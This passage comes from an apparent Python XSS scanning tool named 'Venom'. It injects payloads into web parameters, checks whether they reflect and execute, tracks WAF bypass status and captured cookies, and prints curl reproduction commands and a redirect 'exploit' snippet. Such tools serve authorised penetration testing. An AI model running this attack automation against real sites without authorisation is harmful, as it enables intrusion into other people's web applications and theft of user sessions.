                    soup = BeautifulSoup(resp.text, 'html.parser')
                    sanitized = soup.get_text().lower()
                    if '<' not in sanitized and '>' not in sanitized:
                        logging.info(f"Payload not reflected: {payload} (Likely sanitized or filtered)")
                    else:
                        logging.info(f"Payload not reflected: {payload} (No match found)")
                    continue
                
                soup = BeautifulSoup(resp.text, 'html.parser')
                in_executable_context = False
                for tag in soup.find_all(True):
                    tag_str = str(tag).lower()
                    if payload.lower() in tag_str:
                        in_executable_context = any(attr.startswith('on') or attr in ['src', 'href', 'autofocus'] for attr in tag.attrs) or '<script' in tag_str
                        if in_executable_context:
                            logging.debug(f"Executable context confirmed for {payload} in {tag_str[:200]}...")
                        break
                
                similarity = self.check_similarity(base_response, resp.text)
                full_url = url + ('?' + urlencode(params) if method == 'get' else '')
                executed = False
                if in_executable_context or 'javascript:' in payload.lower():
                    executed = self.verify_execution(full_url, payload)
                elif reflected and similarity > 0.85 and base_response:  # Lowered from 0.9
                    logging.debug(f"Response too similar to base (Similarity: {similarity}), but checking execution")
                    executed = self.verify_execution(full_url, payload) if self.args.verify_execution else False
                
                if reflected or executed:
                    severity = "High" if executed else "Medium" if in_executable_context else "Low"
                    self.report_vulnerability(full_url, payload, params, f"{injection_point} XSS (Executable: {executed or in_executable_context}, Severity: {severity})", executed)
                    if self.ai_assistant and executed:
                        self.ai_assistant.record_success(payload, "html" if '<' in resp.text else "js")
                    self.payload_generator.update_success(payload)
                return resp
            except RequestException as e:
                logging.warning(f"Request failed: {e} (Attempt {attempt+1})")
                time.sleep(2 ** attempt)
        return None

    def check_similarity(self, base_response: str, test_response: str) -> float:
        try:
            vectorizer = TfidfVectorizer()
            tfidf = vectorizer.fit_transform([base_response, test_response])
            return cosine_similarity(tfidf[0:1], tfidf[1:2])[0][0]
        except Exception:
            return 0.0

    def _display_status(self, final: bool = False) -> None:
        elapsed = int(time.time() - self.start_time)
        progress = min((self.total_tests.get() / self.total_payloads * 100) if self.total_payloads else 0, 100.0)
        status = f"{BLUE}╔════ Scan Progress ═════╗{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Progress:{RESET} {WHITE}{progress:.1f}%{RESET} {CYAN}Tests:{RESET} {WHITE}{self.total_tests.get()}/{self.total_payloads}{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Vulns:{RESET} {RED}{len(self.vulnerabilities)}{RESET} {CYAN}Time:{RESET} {WHITE}{elapsed}s{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Method:{RESET} {YELLOW}{self.current_method}{RESET} {CYAN}Param:{RESET} {YELLOW}{self.current_param}{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Current Cookie:{RESET} {ORANGE}{self.current_cookie}{RESET}\n" \
                 f"{BLUE}║{RESET} {CYAN}Current Payload:{RESET} {ORANGE}{self.current_payload}{RESET}\n" \
                 f"{BLUE}╚════════════════════════╝{RESET}"
        logging.info(f"Tests performed: {self.total_tests.get()}/{self.total_payloads}")
        if final:
            print(status)
        else:
            sys.stdout.write(f"\033[6A\033[2K{status}\033[0m")
            sys.stdout.flush()

    def report_vulnerability(self, url: str, payload: str, params: dict, vuln_type: str, popup: bool) -> None:
        with self.lock:
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            vuln = {
                'url': url,
                'payload': payload,
                'type': vuln_type,
                'timestamp': timestamp,
                'executed': popup,
                'context': 'JavaScript' if 'script' in payload.lower() or 'javascript:' in payload.lower() else 'HTML',
                'waf_status': self.waf_ips_status,
                'bypass': "Yes" if self.bypass_performed or self.use_403_bypass else "No",
                'params': params,
                'cookies': dict(self.session.cookies),
                'method': self.args.method if self.args.method != 'both' else 'post' if 'Form' in vuln_type else 'get'
            }
            if vuln in self.vulnerabilities:
                return
            self.vulnerabilities.append(vuln)

            severity = vuln_type.split("Severity: ")[1].split(")")[0]
            severity_color = GREEN if "Low" in severity else ORANGE if "Medium" in severity else RED
            output = f"{RED}╔════════════════════════════════════════════════════╗{RESET}\n" \
                     f"{RED}║{RESET} {RED}XSS DETECTED [{timestamp}]{RESET} {RED}║{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Type:{RESET} {CYAN}{vuln_type.split('Severity:')[0]}{RESET}{WHITE}Severity:{RESET} {severity_color}{severity}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}URL:{RESET} {GREEN}{url}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Payload:{RESET} {ORANGE}{payload}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Context:{RESET} {PURPLE}{vuln['context']}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Executed:{RESET} {GREEN}{'Yes' if popup else 'No'}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Cookies:{RESET} {YELLOW}{vuln['cookies']}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}WAF/IPS:{RESET} {YELLOW}{self.waf_ips_status}{RESET} | {WHITE}Bypass:{RESET} {YELLOW}{vuln['bypass']}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Verify:{RESET} {BLUE}curl -X {vuln['method'].upper()} \"{url}\" {'-d \"' + urlencode(params) + '\"' if vuln['method'] == 'post' else ''} {'-H \"Cookie: ' + '; '.join([f'{k}={v}' for k, v in vuln['cookies'].items()]) + '\"' if vuln['cookies'] else ''}{RESET}\n"
            if popup and "High" in severity:
                output += f"{RED}║{RESET} {WHITE}Exploit:{RESET} {GREEN}<html><body><script>window.location='{url}';</script></body></html>{RESET}\n"
            output += f"{RED}╚════════════════════════════════════════════════════╝{RESET}"
            print(output)
            logging.info(output)

    def report(self) -> None:
        runtime = int(time.time() - self.start_time)
        executed_count = sum(1 for v in self.vulnerabilities if v['executed'])
        summary = f"{BLUE}╔════════════════════════════════════════════════════╗{RESET}\n" \
                  f"{BLUE}║{RESET}         {CYAN}Venom XSS Scan Summary{RESET}                 {BLUE}║{RESET}\n" \
                  f"{BLUE}╚════════════════════════════════════════════════════╝{RESET}\n" \
                  f"{WHITE}Scan Started:{RESET} {GREEN}{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.start_time))}{RESET}\n" \
                  f"{WHITE}Scan Ended:{RESET} {GREEN}{time.strftime('%Y-%m-%d %H:%M:%S')}{RESET}\n" \
                  f"{WHITE}Total Runtime:{RESET} {YELLOW}{runtime} seconds{RESET}\n" \
                  f"{WHITE}URLs Scanned:{RESET} {CYAN}{len(self.visited_urls)}{RESET}\n" \
                  f"{WHITE}Tests Performed:{RESET} {CYAN}{self.total_tests.get()}{RESET}\n" \
                  f"{WHITE}Last Method:{RESET} {YELLOW}{self.current_method}{RESET} {WHITE}Last Parameter:{RESET} {YELLOW}{self.current_param}{RESET}\n" \
                  f"{WHITE}Vulnerabilities Found:{RESET} {RED}{len(self.vulnerabilities)}{RESET}\n" \
                  f"{WHITE}Executable Vulns:{RESET} {ORANGE}{executed_count}{RESET}\n" \
                  f"{WHITE}Reflected Only:{RESET} {YELLOW}{len(self.vulnerabilities) - executed_count}{RESET}\n"
        if self.vulnerabilities:
            summary += f"{BLUE}╔════ Detected Vulnerabilities ═════╗{RESET}\n"
            for vuln in self.vulnerabilities:
                summary += f"{BLUE}║{RESET} {WHITE}URL:{RESET} {GREEN}{vuln['url']}{RESET}\n" \
                           f"{BLUE}║{RESET} {WHITE}Payload:{RESET} {ORANGE}{vuln['payload']}{RESET}\n" \
                           f"{BLUE}║{RESET} {WHITE}Severity:{RESET} {'\033[91mHigh\033[0m' if vuln['executed'] else '\033[38;5;208mMedium\033[0m' if 'Medium' in vuln['type'] else '\033[93mLow\033[0m'}\n"
            summary += f"{BLUE}╚════════════════════════════════════╝{RESET}"
        print(summary)
        logging.info(summary)

if __name__ == "__main__":
    try:
        args = parse_args()
        scanner = Venom(args)
        scanner.scan()
    except KeyboardInterrupt:
        logging.info("Scan interrupted")
        if 'scanner' in locals():
            scanner.running = False
            scanner.report()
        sys.exit(0)
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        if 'scanner' in locals():
            scanner.report()
        sys.exit(1)
